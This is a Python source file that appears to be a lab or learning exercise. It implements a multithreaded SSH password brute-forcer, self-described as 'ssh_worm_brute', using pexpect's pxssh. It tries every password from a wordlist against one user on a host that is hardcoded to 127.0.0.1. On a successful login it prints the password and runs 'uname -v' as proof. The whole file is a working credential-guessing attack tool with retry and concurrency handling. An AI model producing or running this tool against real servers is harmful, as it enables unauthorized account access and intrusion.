# Attempt at commenting more thoroughly
# -----------------------
# Imports
# -----------------------
import threading
import time
import sys
import socket
from typing import Optional
from pexpect import pxssh

# -----------------------
# INSERT HARDCODE HERE!!!
# -----------------------
HOST = "127.0.0.1"
USER = "test11"
PASSFILE = "passwords.txt"
MAXCONN = 5
TIMEOUT = 30
# -----------------------
# Global variables
# found, global flag gets set to true once password is found.
# -----------------------
found = False
found_lock = threading.Lock()
connection_lock: Optional[threading.BoundedSemaphore] = None

# -----------------------
# Logger helper 
# makes output cleaner and timestamp
# -----------------------
def log(msg: str):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{ts}] {msg}")

# -----------------------
# connect function 
# - handle auth refused -> read nonblocking -> prompt/timeouts
# -----------------------
def connect(host: str, user: str, password: str, release: bool = True, timeout: int = TIMEOUT):
    global found, connection_lock

    # quick skip if already found elsewhere
    with found_lock:
        if found:
            if release and connection_lock:
                try:
                    connection_lock.release()
                except Exception:
                    pass
            return

    # create pxssh
    try:
        # wrap pexpect.spawn for ssh
        s = pxssh.pxssh(timeout=timeout, encoding='utf-8')
    except Exception as e:
        log(f"[-] pxssh creation error for {user}:{password}: {e}")
        if release and connection_lock:
            try:
                connection_lock.release()
            except Exception:
                pass
        return

    try:
        # attempt to login
        log(f"[~] Trying {user}@{host} : '{password}'")
        s.login(host, user, password, auto_prompt_reset=True, login_timeout=timeout)

        # success so show me that password!
        with found_lock:
            found = True
        log(f"[+] PASSWORD FOUND --> {user}@{host} : {password}")

        # evidence command that in fact in the system: uname -v
        try:
            s.sendline('uname -v')
            s.prompt(timeout=5)
            print("\n--- Remote uname -v output ---\n")
            print(s.before)
            print("\n--- end uname output ---\n")
        except Exception as e:
            log(f"[!] Could not run uname: {e}")

       

    except pxssh.ExceptionPxssh as e:
        # pxssh specific Exceptions
        err_str = str(e).lower()

        # authentication refused -> bad password
        if 'authentication' in err_str or 'permission denied' in err_str or 'password' in err_str:
            log(f"[-] Auth failed for {user}:{password}")
            return

        # server busy / read_nonblocking -> sleep & retry same password 
        if 'read_nonblocking' in err_str or 'resource temporarily unavailable' in err_str:
            log(f"[!] Server busy for '{password}' - sleeping 2s then retrying (release={release})")
            time.sleep(2)
            try:
                connect(host, user, password, release=False, timeout=timeout)
            except Exception:
                pass
            return

        # Short FIX for prompt/timeout issues -> sleep briefly then return
        if 'prompt' in err_str or 'timed out' in err_str or 'timeout' in err_str:
            log(f"[!] pxssh prompt/timeout for '{password}' - sleeping 1s and returning")
            time.sleep(1)
            return

        log(f"[!] pxssh exception for {user}:{password}: {e}")
        return

    except socket.timeout:
        log(f"[!] Socket timeout for {user}:{password}")
        time.sleep(1)
        return

    except Exception as e:
        log(f"[!] Unexpected error for {user}:{password}: {e}")
        return

    finally:
            # just release, dont need to stay for brute force just need password.
        if release and connection_lock:
            try:
                connection_lock.release()
            except Exception:
                pass






# -----------------------
# Main
# - Reads PASSFILE, initializes semaphore, spawns threads
# -----------------------
def main():
    global connection_lock, found

    log("Starting ssh_worm_brute")
    log(f"Target: {USER}@{HOST}  passfile: {PASSFILE}  maxconn: {MAXCONN}")

    # Read passwords file
    try:
        with open(PASSFILE, 'r', encoding='utf-8', errors='ignore') as fh:
            passwords = [line.strip() for line in fh if line.strip()]
    except Exception as e:
        log(f"[-] Could not open password file '{PASSFILE}': {e}")
        sys.exit(1)
    # Check if file is empty
    if not passwords:
        log("[-] Password file empty. Exiting.")
        sys.exit(1)

    # initliaze the semaphore
    connection_lock = threading.BoundedSemaphore(value=MAXCONN)
    threads = []

    try:
        for pw in passwords:
            # early stop if password found
            with found_lock:
                if found:
                    break
            connection_lock.acquire()
            t = threading.Thread(target=connect, args=(HOST, USER, pw, True, TIMEOUT))
            t.start()
            threads.append(t)
            # tiny spacing to avoid microbursts
            time.sleep(0.01)

        # join threads but allow break if password found
        for t in threads:
            t.join()
          

    except KeyboardInterrupt:
        log("[!] Interrupted by user (Ctrl-C)")

    finally:
        # short grace for threads to finish
        time.sleep(1)
        with found_lock:
            # Good day PASSWORD ACQUIRED otherwise try again.
            if found:
                log("[+] Brute force completed: password FOUND.")
            else:
                log("[-] Brute force completed: password NOT found in list.")


if __name__ == "__main__":
    main()